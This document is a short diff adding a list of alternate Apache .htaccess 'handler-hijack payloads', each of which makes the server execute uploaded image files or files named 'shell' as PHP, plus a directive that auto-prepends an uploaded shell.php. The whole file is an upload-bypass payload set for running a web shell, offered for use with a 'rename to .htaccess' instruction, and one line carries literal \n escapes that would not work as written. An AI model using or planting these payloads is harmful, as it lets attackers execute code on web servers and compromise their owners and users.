@@ -1,0 +1,7 @@
+# Alternate .htaccess handler-hijack payloads (rename to .htaccess to use one):
+AddType application/x-httpd-php .jpg .png .gif
+AddHandler application/x-httpd-php .jpg
+SetHandler application/x-httpd-php
+<FilesMatch "shell">\n  SetHandler application/x-httpd-php\n</FilesMatch>
+php_value auto_prepend_file /var/www/uploads/shell.php
+php_flag engine on
